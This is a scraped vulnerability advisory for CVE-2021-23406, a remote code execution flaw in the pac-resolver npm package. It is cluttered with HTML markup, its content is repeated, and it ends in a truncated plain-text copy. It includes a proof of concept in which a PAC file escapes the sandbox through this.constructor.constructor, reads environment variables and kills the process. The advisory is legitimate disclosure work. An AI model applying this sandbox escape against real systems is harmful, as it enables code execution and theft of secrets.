CVE-2021-23406 Detail

Description

This affects the package pac-resolver before 5.0.0. This can occur when used with untrusted input, due to unsafe PAC file handling. **NOTE:** The fix for this vulnerability is applied in the node-degenerator library, a dependency written by the same maintainer.


Severity

NIST: NVD

    How to fix?
  </h2> <div class="vue--prose" data-v-6b6ff1c7="" data-v-5c17117c=""><div class="vue--markdown-to-html markdown-description" data-v-185c2450="" data-v-5c17117c="" data-v-6b6ff1c7=""><p>There is no fixed version for <code>org.webjars.npm:pac-resolver</code>.</p>
</div></div> </div></div></div> <div data-v-43af9ae8="" data-v-3abfa519=""><div class="markdown-section" data-v-5c17117c="" data-v-3abfa519="" data-v-43af9ae8=""><h2 class="vue--heading heading" data-v-8dd2f746="" data-v-5c17117c="">
    Overview
  </h2> <div class="vue--prose" data-v-6b6ff1c7="" data-v-5c17117c=""><div class="vue--markdown-to-html markdown-description" data-v-185c2450="" data-v-5c17117c="" data-v-6b6ff1c7=""><p>Affected versions of this package are vulnerable to Remote Code Execution (RCE). This can occur when used with untrusted input, due to unsafe PAC file handling.</p>
<p>In order to exploit this vulnerability in practice, this either requires an attacker on your local network, a specific vulnerable configuration, or some second vulnerability that allows an attacker to set your config values.</p>
<p><strong>NOTE:</strong> The fix for this vulnerability is applied in the <code>node-degenerator</code> library, a dependency is written by the same maintainer. </p>
<h3>PoC</h3>
<pre class="  language-js" tabindex="0"><code class="  language-js"><span class="token keyword">const</span> pac <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'pac-resolver'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// Should keep running forever (if not vulnerable):</span>
<span class="token function">setInterval</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Still running"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// Parsing a malicious PAC file unexpectedly executes unsandboxed code:</span>
<span class="token function">pac</span><span class="token punctuation">(</span>`
    <span class="token comment">// Real PAC config:</span>
    <span class="token keyword">function</span> <span class="token function">FindProxyForURL</span><span class="token punctuation">(</span><span class="token parameter">url<span class="token punctuation">,</span> host</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token string">"DIRECT"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token comment">// But also run arbitrary code:</span>
<span class="token keyword">var</span> f <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>constructor<span class="token punctuation">.</span><span class="token function">constructor</span><span class="token punctuation">(</span>\`
    <span class="token comment">// Running outside the sandbox:</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token operator">&</span>#<span class="token number">39</span><span class="token punctuation">;</span>Read env vars<span class="token operator">:</span><span class="token operator">&</span>#<span class="token number">39</span><span class="token punctuation">;</span><span class="token punctuation">,</span> process<span class="token punctuation">.</span>env<span class="token punctuation">)</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token operator">&</span>#<span class="token number">39</span><span class="token punctuation">;</span><span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span> <span class="token constant">PAC</span> file is running arbitrary code <span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span><span class="token operator">&</span>#<span class="token number">39</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token operator">&</span>#<span class="token number">39</span><span class="token punctuation">;</span>Can read <span class="token operator">&</span>amp<span class="token punctuation">;</span> could exfiltrate env vars <span class="token operator">^</span><span class="token operator">&</span>#<span class="token number">39</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token operator">&</span>#<span class="token number">39</span><span class="token punctuation">;</span>Can kill parsing process<span class="token punctuation">,</span> like so<span class="token operator">:</span><span class="token operator">&</span>#<span class="token number">39</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    process<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Kill the vulnerable process</span>
    <span class="token comment">// etc etc</span>
\`<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

</code><p><code class="  language-js"></code></p></pre><p></p>

    How to fix?
  </h2> <div class="vue--prose" data-v-6b6ff1c7="" data-v-5c17117c=""><div class="vue--markdown-to-html markdown-description" data-v-185c2450="" data-v-5c17117c="" data-v-6b6ff1c7=""><p>Upgrade <code>pac-resolver</code> to version 5.0.0 or higher.</p>
</div></div> </div></div></div> <div data-v-43af9ae8="" data-v-3abfa519=""><div class="markdown-section" data-v-5c17117c="" data-v-3abfa519="" data-v-43af9ae8=""><h2 class="vue--heading heading" data-v-8dd2f746="" data-v-5c17117c="">
    Overview
  </h2> <div class="vue--prose" data-v-6b6ff1c7="" data-v-5c17117c=""><div class="vue--markdown-to-html markdown-description" data-v-185c2450="" data-v-5c17117c="" data-v-6b6ff1c7=""><p>Affected versions of this package are vulnerable to Remote Code Execution (RCE). This can occur when used with untrusted input, due to unsafe PAC file handling.</p>
<p>In order to exploit this vulnerability in practice, this either requires an attacker on your local network, a specific vulnerable configuration, or some second vulnerability that allows an attacker to set your config values.</p>
<p><strong>NOTE:</strong> The fix for this vulnerability is applied in the <code>node-degenerator</code> library, a dependency is written by the same maintainer. </p>
<h3>PoC</h3>
<pre class="  language-js" tabindex="0"><code class="  language-js"><span class="token keyword">const</span> pac <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'pac-resolver'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// Should keep running forever (if not vulnerable):</span>
<span class="token function">setInterval</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Still running"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// Parsing a malicious PAC file unexpectedly executes unsandboxed code:</span>
<span class="token function">pac</span><span class="token punctuation">(</span>`
    <span class="token comment">// Real PAC config:</span>
    <span class="token keyword">function</span> <span class="token function">FindProxyForURL</span><span class="token punctuation">(</span><span class="token parameter">url<span class="token punctuation">,</span> host</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token string">"DIRECT"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token comment">// But also run arbitrary code:</span>
<span class="token keyword">var</span> f <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>constructor<span class="token punctuation">.</span><span class="token function">constructor</span><span class="token punctuation">(</span>\`
    <span class="token comment">// Running outside the sandbox:</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token operator">&</span>#<span class="token number">39</span><span class="token punctuation">;</span>Read env vars<span class="token operator">:</span><span class="token operator">&</span>#<span class="token number">39</span><span class="token punctuation">;</span><span class="token punctuation">,</span> process<span class="token punctuation">.</span>env<span class="token punctuation">)</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token operator">&</span>#<span class="token number">39</span><span class="token punctuation">;</span><span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span> <span class="token constant">PAC</span> file is running arbitrary code <span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span><span class="token operator">&</span>#<span class="token number">39</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token operator">&</span>#<span class="token number">39</span><span class="token punctuation">;</span>Can read <span class="token operator">&</span>amp<span class="token punctuation">;</span> could exfiltrate env vars <span class="token operator">^</span><span class="token operator">&</span>#<span class="token number">39</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token operator">&</span>#<span class="token number">39</span><span class="token punctuation">;</span>Can kill parsing process<span class="token punctuation">,</span> like so<span class="token operator">:</span><span class="token operator">&</span>#<span class="token number">39</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    process<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Kill the vulnerable process</span>
    <span class="token comment">// etc etc</span>
\`<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

</code><p><code class="  language-js"></code></p></pre><p></p>

Overview Affected versions of this package are vulnerable to Remote Code Execution (RCE). This can occur when used with untrusted input, due to unsafe PAC file handling. In order to exploit this vulnerability in practice, this either requires an attacker on your local network, a specific vulnerable configuration, or some second vulnerability that allows an attacker to set your config values. NOTE: The fix for this vulnerability is applied in the node-degenerator library, a dependency is written by the same maintainer. PAC file is running arbitrary code !!!'); console.log('Can read & could exfiltrate env vars ^'); console.log('Can kill parsing process, like so:'); process.exit(100); // Kill the vulnerable process // etc etc \`); f(); References GitHub Commit #1 GitHub Commit #2 Github Release Researcher Blog 漏 2023 Snyk Limited Registered in England and Wales.
